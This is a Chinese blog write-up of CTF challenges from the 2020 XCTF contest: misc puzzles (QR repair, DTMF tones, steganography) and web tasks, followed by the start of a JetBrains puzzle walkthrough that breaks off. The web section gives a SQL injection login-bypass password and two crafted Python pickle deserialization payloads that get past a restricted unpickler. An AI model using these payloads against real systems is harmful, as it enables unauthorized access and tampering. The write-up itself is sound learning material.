src="/2020/03/15/CTF_2020XCTF_gxzy/QRcode.jpg" alt="二维码"></p><p>发现二维码被扣掉了三个定位脚而且反色了，于是补全</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/QRcode2.jpg" alt="二维码_修复后"></p><p>扫码得到（可能补得不是很好，但发现手机 QQ 的扫码真的强</p><pre><code>flag{this_is_also_not_flag} 解压密码不在这里0.0！</code></pre><p>假的flag！发现并不能解压。</p><p>同时在十六进制编辑器里看到最后有一段字符串：<code>TOGETYOURFLAG</code>。<em>（有点懵，好像没啥用的亚子</em></p><p>再看回压缩包，根据文件名 <code>纯数字</code>，于是暴力跑了一波，然而并不行。</p><p>于是想到<strong>伪加密</strong>，果然如此。</p><p>解压得到<code>隐藏的信息.wav</code>，音频内容大概就是 <code>我的武汉尽快好起来</code> 之类的，挺应景的，也挺励志的。</p><p>在音频最后发现了比较微弱的<strong>拨号声音</strong>，看了看频域，发现了如下的频谱。（在最前面和最后面都有这样的信号）</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/spectrum.png" alt="spectrum"></p><p>每个拨号声由两个频率叠加而成。</p><p>想起来刚放寒假的时候有个学弟还问过拨号的原理，那时候还答不上来，查了半天没找到合适的资料。</p><p>这次再去谷歌查了一下，发现原来这叫做 <strong>DTMF 信号</strong>。</p><blockquote><p><strong><a href="https://zh.wikipedia.org/wiki/%E5%8F%8C%E9%9F%B3%E5%A4%9A%E9%A2%91" target="_blank" rel="noopener">双音多频信号</a>（Dual-Tone Multi-Frequency, DTMF）</strong>，电话系统中电话机与交换机之间的一种用户信令，最常用于发拨号时送被叫号码。</p><p>双音多频的拨号键盘是4×4的矩阵，每一行代表一个<em>高</em>频，每一列代表一个<em>低</em>频。每按一个键就发送一个<em>高</em>频和<em>低</em>频的正弦信号组合，比如’1’相当于697和1209赫兹（Hz）。交换机可以解码这些频率组合并确定所对应的按键。</p><p><em>（来自维基百科）</em></p></blockquote><table><thead><tr><th align="center"></th><th align="center">1209 Hz</th><th align="center">1336 Hz</th><th align="center">1477 Hz</th><th align="center">1633 Hz</th></tr></thead><tbody><tr><td align="center">697 Hz</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">A</td></tr><tr><td align="center">770 Hz</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">B</td></tr><tr><td align="center">852 Hz</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">C</td></tr><tr><td align="center">941 Hz</td><td align="center">*</td><td align="center">0</td><td align="center">#</td><td align="center">D</td></tr></tbody></table><p>本来想利用网络上在线的解码工具，然而发现网站不是上不去就是停止服务了。（噗</p><p>那还是自己来吧。</p><p>对于每一位号码分别查看频谱，根据最接近的低频和高频信号对应于表格内的数字/字母。（挺佩服直接就听出来的大佬</p><p>得到音频最后面这几个数字为 <code>5618521</code>，最前面的几个为 <code>18748</code>。</p><p>凑成 <code>flag{187485618521}</code> 交上去，不对！</p><p>难道两部分反了？于是倒过来再试，不行。</p><p>难道要倒叙？不行。</p><p>难道是字母？于是转成键盘上1-0对应着下面的一行字母，试了试，不行。</p><p>难道是哪个数字搞错了？？？再确认了一遍，队友也确认了一遍，就是这个啊（黑脸。</p><p>Base64 解码一下，不对不可能。</p><p>于是卡在这里了。</p><blockquote><p>看到别人 WP 的时候发现蠢死了，想到 base64 解码没想到反过来编码……</p><p>然而人家<code>二维码</code>里给提示了，只是提示不在结尾而已。</p><p>呐，<strong>USEBASE64TOGETYOURFLAG</strong>.</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/usebase64.png" alt="usebase64"></p><p>下次得先用 <code>strings</code> 来看看……</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/strings_base64.png" alt="strings"></p></blockquote><p>于是 flag 就是 <code>flag{MTg3NDg1NjE4NTIx}</code>。</p><hr><p>找资料的时候发现了有大佬在单片机上实现 DTMF 软解码的。</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/dtmf_soft.png" alt="单片机软解码"></p><p>在线生成某种特定音调的网站：<a href="http://onlinetonegenerator.com/dtmf.html" target="_blank" rel="noopener">http://onlinetonegenerator.com/dtmf.html</a></p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/toneGenerator.png" alt="toneGenerator"></p><p>其他一些资料：</p><p><a href="https://www.audiocheck.net/audiocheck_dtmf.php" target="_blank" rel="noopener">另一个在线 DTMF 生成工具 DTMF Tone Generator</a></p><p><a href="http://dialabc.com/sound/detect/" target="_blank" rel="noopener">一个在线 DTMF 解码工具 Detect DTMF Tones</a>（好像上不去）</p><p><a href="https://blog.csdn.net/hankhanti/article/details/49902441" target="_blank" rel="noopener">DTMF 编码及解码</a></p><p>GitHub项目：      </p><p><strong><a href="https://github.com/MeowLucian/DTMF_Detector" target="_blank" rel="noopener">DTMF_Detector</a></strong>  📞 Using Matlab to simulate Dual-Tone Multi-Frequency (DTMF) of telephone        </p><p><strong><a href="https://github.com/OmaymaS/DTMF-Detection-Goertzel-Algorithm-" target="_blank" rel="noopener">DTMF-Detection-Goertzel-Algorithm-</a></strong>  DTMF detection system developed on AVR Atmega128 board based on Goertzel algorithm        </p><br><hr><h3 id="武汉加油"><a href="#武汉加油" class="headerlink" title="武汉加油"></a>武汉加油</h3><p>发现附件只有一张图片↓。</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/1.jpg" alt=""></p><blockquote><p>首先祝武汉加油，中国加油，向医护人员致敬。</p></blockquote><p>发现了文件拼接了一个 RAR 文件，foremost 提取不出来，懒得开 Ubuntu 用 binwalk 了，于是直接手动提取出压缩包。</p><p>得到一个<code>flag.exe</code>.</p><p>什么？MISC 题还要 RE？？？</p><p>然而看了一下发现解不了，好像加壳了。</p><p>随便猜了一下和武汉加油相关的 flag 交上去，都不对……</p><p>看了大佬们的 WP 发现是 <code>flag{zhong_guo_jia_you}</code> … 中国加油！</p><p>（佩服直接猜出来的）</p><blockquote><p>原来图片里还隐写了密码，用 steghide 爆破提取出 <code>ﬂag.txt</code>，可以得到密码<code>' 武 汉 加 油 !</code>，输入到 <code>flag.exe</code>就可以得到 flag。（emmm</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/zhongguojiayou.png" alt="zhongguojiayou"></p></blockquote><br><h3 id="ez-mem-amp-usb"><a href="#ez-mem-amp-usb" class="headerlink" title="ez_mem&amp;usb"></a>ez_mem&amp;usb</h3><p>MISC 是真的杂……</p><p><code>captured.pcap</code>抓包文件，可以在一堆流量中提取出一个上传文件的页面<code>upload_file.php</code>。</p><p>从提交的 form 里可以提取出一个 <code>data.zip</code>.</p><p>压缩包里是一个 <code>data.vmem</code>，噫一个虚拟机内存镜像。</p><p>懵了，没玩过内存取证的题目唉<em>（好菜啊</em></p><p>看题目后面应该还需要提取 USB 的数据，大概 flag 在 USB 数据里吧。</p><p>后面有空再学学 volatility 内存取证。</p><br><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h3><blockquote><p><a href="http://121.37.161.79:8005" target="_blank" rel="noopener">http://121.37.161.79:8005</a></p></blockquote><p>就是输入<strong>用户名</strong>和<strong>密码</strong>登录那种，用 PHP 的 PDO 来连接数据库。用户名需要为<code>admin</code>。</p><p>毕竟是 checkin 题，感觉应该不会太难。然而试了试常用的万能密码发现并没有效果，都被 Deny 了。</p><p>然后队友在网上搜到了原题—— <a href="https://gksec.com/HNCTF2019-Final.html#toc-sqlsql" target="_blank" rel="noopener">湖南省第三届大学生信息安全水赛WriteUp</a>.</p><p><code>'-0-'</code>可以代替<code>'or'1</code>绕过。于是构造参数如下即可。</p><p><code>username=admin&amp;password='-0-'</code></p><blockquote><p>立个 flag，后面好好学一下 SQL（</p></blockquote><br><h3 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h3><blockquote><p><a href="http://121.36.222.22:10019/" target="_blank" rel="noopener">http://121.36.222.22:10019/</a></p></blockquote><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp.png" alt="webtmp"></p><p>源码：</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp_source.png" alt="source code"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> pickle<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Animal</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> category<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>category <span class="token operator">=</span> category    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> f<span class="token string">'Animal(name={self.name!r}, category={self.category!r})'</span>    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> type<span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> Animal <span class="token operator">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token operator">and</span> self<span class="token punctuation">.</span>category <span class="token operator">==</span> other<span class="token punctuation">.</span>category<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span>encoding<span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>        <span class="token keyword">return</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'source'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>read<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pickle_data <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> b<span class="token string">'R'</span> <span class="token keyword">in</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                result <span class="token operator">=</span> restricted_loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> type<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token operator">not</span> Animal<span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token string">'Are you sure that is an animal???'</span>            correct <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> Animal<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>name<span class="token punctuation">,</span> secret<span class="token punctuation">.</span>category<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'unpickle_result.html'</span><span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">,</span> pickle_data<span class="token operator">=</span>pickle_data<span class="token punctuation">,</span> giveflag<span class="token operator">=</span>correct<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>repr<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"Something wrong"</span>    sample_obj <span class="token operator">=</span> Animal<span class="token punctuation">(</span><span class="token string">'mmm'</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>       pickle_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sample_obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'unpickle_page.html'</span><span class="token punctuation">,</span> sample_obj<span class="token operator">=</span>sample_obj<span class="token punctuation">,</span> pickle_data<span class="token operator">=</span>pickle_data<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span></code></pre><p><em>（可能有些地方被我不小心改了</em></p><p>看到 pickle 想到了反序列化，之前只听说过 PHP 有反序列化漏洞，这里才知道原来 python 也有。</p><p>这次正好就来了解一下 pickle 反序列化吧。</p><p><em>后面再记一下这一块的笔记吧（大概率咕咕咕</em></p><p>可以用 <strong>pickletools 这个反汇编工具</strong>来帮助理解 pickle 代码，即<code>opcode</code> 。</p><p>比如这里把<code>name</code>设成 <code>'mmm'</code>，<code>category</code>设为 <code>'aaaa'</code>，而后生成 pickle，可以看到各个命令的含义。</p><pre class=" language-bash"><code class="language-bash">$ python3 -m pickletools -a ./data    0: \x80 PROTO      3              Protocol version indicator.    2: c    GLOBAL     <span class="token string">'__main__ Animal'</span> Push a global object <span class="token punctuation">(</span>module.attr<span class="token punctuation">)</span> on the stack.   19: q    BINPUT     0                 Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   21: <span class="token punctuation">)</span>    EMPTY_TUPLE                  Push an empty tuple.   22: \x81 NEWOBJ                       Build an object instance.   23: q    BINPUT     1                 Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   25: <span class="token punctuation">}</span>    EMPTY_DICT                   Push an empty dict.   26: q    BINPUT     2                 Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   28: <span class="token punctuation">(</span>    MARK                         Push markobject onto the stack.   29: X        BINUNICODE <span class="token string">'name'</span>        Push a Python Unicode string object.   38: q        BINPUT     3             Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   40: X        BINUNICODE <span class="token string">'mmm'</span>         Push a Python Unicode string object.   48: q        BINPUT     4             Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   50: X        BINUNICODE <span class="token string">'category'</span>    Push a Python Unicode string object.   63: q        BINPUT     5             Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   65: X        BINUNICODE <span class="token string">'aaaa'</span>        Push a Python Unicode string object.   74: q        BINPUT     6             Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.   76: u        SETITEMS   <span class="token punctuation">(</span>MARK at 28<span class="token punctuation">)</span>  Add an arbitrary number of key+value pairs to an existing dict.   77: b    BUILD                        Finish building an object, via __setstate__ or dict update.   78: <span class="token keyword">.</span>    STOP                         Stop the unpickling machine.highest protocol among opcodes <span class="token operator">=</span> 2</code></pre><p>看了半天反序列化漏洞，大部分都是<strong>利用<code>__reduce__</code>方法来实现任意代码的执行</strong>。</p><p>如果没有输出的话，可以反弹 shell 到自己的服务器上，利用网站访问日志来得到需要的信息。</p><p>（这时我看了看服务器的 nginx log，发现日常被扫，常见的 admin、phpmyadmin 目录，甚至还有想跨站执行 <code>rm -rf /</code> 的…… </p><p>话说回来，当我写好 <code>__reduce__</code> 方法 post 上去之后，发现被拒绝了。不过代码里也有体现。</p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp_noRCE2.png" alt="no RCEs"></p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp_noRCE.png" alt="No RCE"></p><p>然而想要将 callable 对象执行都必须要调用 <code>reduce</code>，在 pickle 中都会涉及 <code>R</code> 这个字母。</p><p>于是乎不能在服务器上通过执行自己的代码来获取 flag。</p><p>后面突然想到，你不让我 RCE，我可以<strong>改掉你的 <code>secret</code> 中的 <code>name</code> 和 <code>category</code></strong> 啊！</p><p>这里要手搓 pickle 了。当时的思路是<strong>调用 <code>secret</code> 模块的内容对 Animal 进行实例化</strong>。然而比较菜，不知道为啥出了点问题。</p><p>后来又想到<strong>读取 secret 文件读取属性信息进而获取 flag</strong>，不过没有具体的思路，于是到这里就卡住了。</p><blockquote><p>后来看到大佬的 WP，发现果然是<strong>直接改掉这个<code>secret</code></strong>。</p><p>不过具体不是调用 <code>secret</code> 模块，而是直接在 <code>__main__</code> 下建一个自己的<code>secret</code>类，设置自己的属性，覆盖掉 import 进来的<code>secret</code>。再利用自己设置的属性信息去校验就完事了。</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> b<span class="token string">"\x80\x03c__main__\nsecret\n} (X\x04\x00\x00\x00nameX\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\x00\x 00\x00233ub0c__main__\nAnimal\n)\x81} (X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\ x00\x00\x00233ub."</span></code></pre><p>另一个 payload：</p><pre class=" language-python"><code class="language-python">b<span class="token string">"c__main__\nsecret\np0\n0g0\n(}(S'name'\nS'asd'\ndtbg0\n(}(S'category'\nS'123'\ndtb\x80\x04\x95=\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Animal\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x03asd\x94\x8c\x08category\x94\x8c\x03123\x94ub."</span><span class="token comment" spellcheck="true"># base64</span>Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2FzZCcKZHRiZzAKKH0oUydjYXRlZ29yeScKUycxMjMnCmR0YoAElT0AAAAAAAAAjAhfX21haW5fX5SMBkFuaW1hbJSTlCmBlH2UKIwEbmFtZZSMA2FzZJSMCGNhdGVnb3J5lIwDMTIzlHViLg<span class="token operator">==</span></code></pre></blockquote><p><strong>下面这个链接里有关于 pickle 及其反序列化漏洞的更完整的介绍。</strong></p><p><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#" target="_blank" rel="noopener"><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f40d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f40d.png?v8">🐍</span> Security Issues in Python Pickle</a></p><p><em>（Scientific Network needed</em></p><blockquote><p>What is serialization, How to serialize data, Pickle in CTF Challenges, Implementation of Pickle, Vulnerabilities in Wild, Mitigation strategies &amp;&amp; Best practices…</p></blockquote><blockquote><p>里面讲到了几个例题</p><p><a href="http://web.hitctf.cn:10018/" target="_blank" rel="noopener">2019-SJTU-Pickle</a><br><a href="http://web.hitctf.cn:10018/" target="_blank" rel="noopener">2019-SJTU-Pickle-Revenge-Back</a><br><a href="http://web.hitctf.cn:10020/" target="_blank" rel="noopener">2018-HITB-Python-Revenge</a><br><a href="http://web.hitctf.cn:10019/" target="_blank" rel="noopener">2019-SJTU-Pickle-Revenge</a>   （←这个题就和这里这题几乎一个套路</p></blockquote><p>不允许<code>R</code>，他这里的注入思路也是调用 <code>secret</code> 模块的内容对 Animal 进行实例化，有点想不明白我写的哪里出问题了（</p><p>他还进一步实现了对文件的读取。最后的结论是，放弃使用<code>pickle</code>。毕竟太危险了呀！</p><blockquote><p><strong>Extensive Reading:</strong></p><ul><li><p><a href="https://zhuanlan.zhihu.com/p/25981037" target="_blank" rel="noopener">Python Pickle的任意代码执行漏洞实践和Payload构造</a></p></li><li><p><a href="http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/" target="_blank" rel="noopener">绕过 RestrictedUnpickler</a></p></li><li><p><a href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">Python反序列化漏洞的花式利用</a></p></li><li><p><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">关于Python sec的一些简单的总结</a></p></li></ul></blockquote><br><h2 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h2><p>其他的题大概看了看。。不过没什么思路或者有思路不知道怎么实现，好菜啊……</p><p>（怎么大佬们动不动随手就一个 payload 搞定了嘤嘤嘤</p><br><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>再回过头来看这次 CTF 的比赛名称，<strong>高校战“疫”网络安全分享赛</strong>。</p><p>还是挺有意思的吧。主题结合了当下的热点，题目也比较应景，也挺正能量的。</p><p>COVID-19 面前，不仅仅需要中国努力，更需要全世界一起行动起来，共同与疫情进行较量。</p><p>这是整个人类共同面临的困难和挑战，从中也更能意识到<strong>人类命运共同体</strong>的含义了。</p><p><strong>武汉加油，中国加油，世界加油！</strong></p><p>再看 CTF，感觉涉及的面不是一般的广，更多的是想来学点东西吧，你看人家大佬都比你厉害呢。</p><p>其中的 MISC 题经常需要不小的脑洞，比如 武汉加油、隐藏的信息 之类的题目就是呢。</p><p><strong>或许这就是CTF的魅力吧！</strong>  </p><p><img src="/2020/03/15/CTF_2020XCTF_gxzy/charms_of_CTF.png" alt="charms_of_CTF"></p><p>可能文中有的表述不大严谨，不要太在意（</p><p><del>这篇其实写的也很水</del></p><p>（溜</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | JetBrains Quest 3 WriteUp/攻略</title>
      <link href="/2020/03/14/CTF_2020JetBrainsQuest3/"/>
      <url>/2020/03/14/CTF_2020JetBrainsQuest3/</url>
      
        <content type="html"><![CDATA[<h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>晚上看到 JetBrains 最后一个 Quest 出来了，于是继续来解个谜吧！</p><p>前两个 JetBrainsQuest 的 WriteUp 在这里↓呢。</p><p><a href="https://miaotony.xyz/2020/03/12/CTF_2020JetBrainsQuest/"><strong>CTF | JetBrains Quest 1&amp;2 WriteUp/攻略</strong></a> </p><p>这次的难度比上次要大一些，不过总体而言也不太难啦。</p><blockquote><p>ATTENTION! </p><p style="color:red">下面的内容 <strong>涉及剧透</strong>！</p><p><strong>如果想自己做的话，就暂时不要往下看了！</strong></p></blockquote><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>推特地址：</p><p><a href="https://twitter.com/jetbrains/status/1238420744817782784" target="_blank" rel="noopener">https://twitter.com/jetbrains/status/1238420744817782784</a></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Quest3.png" alt="Quest 3"></p><p>噫！这是最后一个 quest 了！来解密吧~</p><blockquote><p>SGF2ZSB5b3Ugc2VlbiB0aGUgcG9zdCBvbiBvdXIgSW5zdGFncmFtIGFjY291bnQ/</p></blockquote><p>base64 解密得到</p><blockquote><p>Have you seen the post on our Instagram account?</p></blockquote><p>去 Instagram 找找线索。</p><br><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>前往 JetBrains 的Ins： <a href="https://www.instagram.com/jetbrains/" target="_blank" rel="noopener">https://www.instagram.com/jetbrains/</a></p><p>第一张图就是熟悉的 Quest 领取福利的页面背景了。</p><p>（留个<a href="https://www.instagram.com/p/B9q-CnhoUVl/" target="_blank" rel="noopener">备份链接</a></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step2.png" alt="Ins"></p><blockquote><p>Welcome to the final Quest! You should start on the Kotlin Playground: <a href="https://jb.gg/kotlin_quest" target="_blank" rel="noopener">https://jb.gg/kotlin_quest</a><br>P.S. If you don’t know about the #JetBrainsQuest, it’s not too late to find out.</p></blockquote><p>得到一个网址：<a href="https://jb.gg/kotlin_quest" target="_blank" rel="noopener">https://jb.gg/kotlin_quest</a></p><br><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>访问上面的网址，发现跳转又跳转，最终来到了一个 <strong>Kotlin 在线编程页面</strong>。</p><p>就是他说的 <code>the Kotlin Playground</code> 吧。</p><p>地址<a href="https://play.kotlinlang.org/#eyJ2ZXJzaW9uIjoiMS4zLjUwIiwiY29kZSI6ImZ1biBtYWluKCkge1xuICAgdmFsIHMgPSBcIlpoI2tkeWgjZWhocSN6cnVubHFqIzU1MjojcnEjd2toI3lsZ2hyI2lydSN3a2gjaWx1dncjaHNsdnJnaCNyaSN3a2gjU2tzVndydXAjSERTMSNMaSN6aCNqZHloI3xyeCNkI2ZveGgvI2x3I3pyeG9nI2VoI2hkdnwjZHYjc2wxXCJcblxuICAgIHZhbCBuOiBJbnQgPSBUT0RPKClcbiAgIGZvciAoYyBpbiBzKSB7XG4gICAgICAgcHJpbnQoYyAtIG4pXG4gICB9XG59IiwicGxhdGZvcm0iOiJqYXZhIiwiYXJncyI6IiJ9" target="_blank" rel="noopener">在这里</a> （链接太长了就不显示出来好了</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step3.png" alt="Step3"></p><pre class=" language-kotlin"><code class="language-kotlin"><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">val</span> s <span class="token operator">=</span> <span class="token string">"Zh#kdyh#ehhq#zrunlqj#552:#rq#wkh#ylghr#iru#wkh#iluvw#hslvrgh#ri#wkh#SksVwrup#HDS1#Li#zh#jdyh#|rx#d#foxh/#lw#zrxog#eh#hdv|#dv#sl1"</span>    <span class="token keyword">val</span> n<span class="token operator">:</span> Int <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span>c <span class="token keyword">in</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token function">print</span><span class="token punctuation">(</span>c <span class="token operator">-</span> n<span class="token punctuation">)</span>   <span class="token punctuation">}</span><span class="token 